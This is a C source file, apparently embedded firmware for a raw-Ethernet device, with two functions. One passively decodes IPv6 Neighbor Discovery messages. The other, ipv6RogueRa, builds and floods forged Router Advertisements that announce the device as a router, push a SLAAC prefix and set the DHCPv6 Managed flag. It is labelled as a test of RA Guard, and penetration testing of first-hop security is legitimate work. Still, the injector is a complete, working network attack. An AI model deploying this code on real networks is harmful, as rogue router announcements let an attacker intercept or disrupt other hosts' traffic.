#include "ipv6_tool.h"
#include "../include/config.h"
#include "net_util.h"
#include "weblog.h"
#include <string.h>

#define Serial Out

#define ETHERTYPE_IPV6 0x86DD
#define IPPROTO_ICMPV6 58

// ---- Helpers ----------------------------------------------------------------

// Derive a fe80::/64 link-local interface ID from a MAC using EUI-64.
static void linkLocalFromMac(const uint8_t mac[6], uint8_t ip6[16])
{
    memset(ip6, 0, 16);
    ip6[0] = 0xFE; ip6[1] = 0x80;
    ip6[8]  = mac[0] ^ 0x02;          // flip U/L bit
    ip6[9]  = mac[1];
    ip6[10] = mac[2];
    ip6[11] = 0xFF; ip6[12] = 0xFE;
    ip6[13] = mac[3];
    ip6[14] = mac[4];
    ip6[15] = mac[5];
}

// Compact textual IPv6 (not fully RFC 5952 canonical, but readable).
static void ip6ToStr(const uint8_t *a, char *out)
{
    char *p = out;
    for (int i = 0; i < 16; i += 2) {
        if (i) *p++ = ':';
        p += sprintf(p, "%x", get16(a + i));
    }
    *p = '\0';
}

// ICMPv6 checksum over the IPv6 pseudo-header + message.
static uint16_t icmp6Checksum(const uint8_t *src, const uint8_t *dst,
                              const uint8_t *msg, uint32_t len)
{
    uint32_t sum = 0;
    for (int i = 0; i < 16; i += 2) sum += get16(src + i);
    for (int i = 0; i < 16; i += 2) sum += get16(dst + i);
    sum += (len >> 16) & 0xFFFF;
    sum += len & 0xFFFF;
    sum += IPPROTO_ICMPV6;
    return inetChecksum(msg, len, sum);
}

// ---- Passive NDP listener ---------------------------------------------------
uint32_t ipv6Listen(W5500Raw &eth, uint32_t seconds)
{
    Serial.printf("\r\nListening for IPv6 NDP for %lu s (any key aborts)...\r\n",
                  (unsigned long)seconds);
    static uint8_t buf[ETH_MAX_LEN + 4];
    uint32_t deadline = millis() + seconds * 1000UL;
    uint32_t n = 0;

    while ((int32_t)(deadline - millis()) > 0) {
        uint16_t len = eth.recvFrame(buf, sizeof(buf));
        if (len >= 14 + 40 + 4 && get16(buf + 12) == ETHERTYPE_IPV6) {
            const uint8_t *ip6 = buf + 14;
            if (ip6[6] == IPPROTO_ICMPV6) {              // next header
                const uint8_t *ic = ip6 + 40;
                uint8_t type = ic[0];
                char s[40], d[40];
                ip6ToStr(ip6 + 8, s); ip6ToStr(ip6 + 24, d);
                const char *name =
                    type == 133 ? "Router Solicitation" :
                    type == 134 ? "Router Advertisement" :
                    type == 135 ? "Neighbor Solicitation" :
                    type == 136 ? "Neighbor Advertisement" :
                    type == 137 ? "Redirect" : nullptr;
                if (name) {
                    Serial.printf("\r\n[%lu] %s\r\n", (unsigned long)(n + 1), name);
                    Serial.printf("   src %s\r\n   dst %s\r\n", s, d);
                    Serial.printf("   from %02X:%02X:%02X:%02X:%02X:%02X\r\n",
                                  buf[6], buf[7], buf[8], buf[9], buf[10], buf[11]);
                    if (type == 134) {
                        Serial.printf("   router lifetime %u s, flags 0x%02X%s\r\n",
                                      get16(ic + 6), ic[5],
                                      (ic[5] & 0x80) ? " (Managed/DHCPv6)" : "");
                    } else if (type == 135 || type == 136) {
                        char tgt[40]; ip6ToStr(ic + 8, tgt);
                        Serial.printf("   target %s\r\n", tgt);
                    }
                    n++;
                }
            }
        }
        if (Serial.available()) { while (Serial.available()) Serial.read(); break; }
        delay(1);
    }
    Serial.printf("\r\nDone. %lu NDP message(s) decoded.\r\n", (unsigned long)n);
    return n;
}

// ---- Rogue Router Advertisement ---------------------------------------------
void ipv6RogueRa(W5500Raw &eth, const uint8_t src[6], uint16_t lifetime,
                 uint32_t count, uint32_t intervalMs)
{
    if (count == 0) count = 10;
    Serial.printf("\r\nRogue IPv6 RA: lifetime %u s, prefix 2001:db8:1::/64, x%lu\r\n",
                  lifetime, (unsigned long)count);
    if (lifetime == 0) Serial.println("(lifetime 0 withdraws us as a router)");
    Serial.println("Tests RA Guard / IPv6 first-hop security. Any key aborts.");

    uint8_t srcIp[16]; linkLocalFromMac(src, srcIp);
    // All-nodes multicast ff02::1 -> MAC 33:33:00:00:00:01
    static const uint8_t allNodes[16] =
        { 0xFF,0x02,0,0,0,0,0,0, 0,0,0,0,0,0,0,1 };
    const uint8_t dstMac[6] = { 0x33,0x33,0x00,0x00,0x00,0x01 };

    uint8_t f[200];
    memset(f, 0, sizeof(f));
    memcpy(f, dstMac, 6);
    memcpy(f + 6, src, 6);
    put16(f + 12, ETHERTYPE_IPV6);

    // ---- ICMPv6 RA message ----
    uint8_t *ic = f + 14 + 40;
    uint16_t o = 0;
    ic[o++] = 134;          // type: Router Advertisement
    ic[o++] = 0;            // code
    ic[o++] = 0; ic[o++] = 0;   // checksum (later)
    ic[o++] = 255;          // cur hop limit
    ic[o++] = 0x80;         // flags: Managed (M) set -> also push DHCPv6 clients
    put16(ic + o, lifetime); o += 2;   // router lifetime
    put32(ic + o, 0); o += 4;          // reachable time
    put32(ic + o, 0); o += 4;          // retrans timer
    // Option: Source link-layer address (type 1, len 1)
    ic[o++] = 1; ic[o++] = 1; memcpy(ic + o, src, 6); o += 6;
    // Option: MTU (type 5, len 1)
    ic[o++] = 5; ic[o++] = 1; ic[o++] = 0; ic[o++] = 0; put32(ic + o, 1500); o += 4;
    // Option: Prefix information (type 3, len 4)
    ic[o++] = 3; ic[o++] = 4;
    ic[o++] = 64;           // prefix length
    ic[o++] = 0xC0;         // flags: On-link + Autonomous (SLAAC)
    put32(ic + o, 86400); o += 4;   // valid lifetime
    put32(ic + o, 14400); o += 4;   // preferred lifetime
    put32(ic + o, 0); o += 4;       // reserved
    // prefix 2001:0db8:0001::/64
    static const uint8_t prefix[16] =
        { 0x20,0x01,0x0d,0xb8,0x00,0x01,0,0, 0,0,0,0,0,0,0,0 };
    memcpy(ic + o, prefix, 16); o += 16;

    uint16_t icmpLen = o;

    // ---- IPv6 header ----
    uint8_t *ip6 = f + 14;
    put32(ip6 + 0, 0x60000000UL);   // version 6
    put16(ip6 + 4, icmpLen);        // payload length
    ip6[6] = IPPROTO_ICMPV6;        // next header
    ip6[7] = 255;                   // hop limit (mandatory 255 for NDP)
    memcpy(ip6 + 8, srcIp, 16);
    memcpy(ip6 + 24, allNodes, 16);

    // Checksum
    put16(ic + 2, icmp6Checksum(srcIp, allNodes, ic, icmpLen));

    uint16_t flen = 14 + 40 + icmpLen;
    if (flen < 60) flen = 60;

    uint32_t sent = 0;
    for (uint32_t i = 0; i < count; i++) {
        if (eth.sendFrame(f, flen)) sent++;
        Serial.printf("  RA %lu sent\r\n", (unsigned long)(i + 1));
        for (uint32_t w = 0; w < intervalMs; w += 50) {
            if (Serial.available()) { while (Serial.available()) Serial.read();
                Serial.printf("Aborted after %lu RA(s).\r\n", (unsigned long)sent); return; }
            delay(50);
        }
    }
    Serial.printf("Sent %lu rogue RA(s).\r\n", (unsigned long)sent);
}
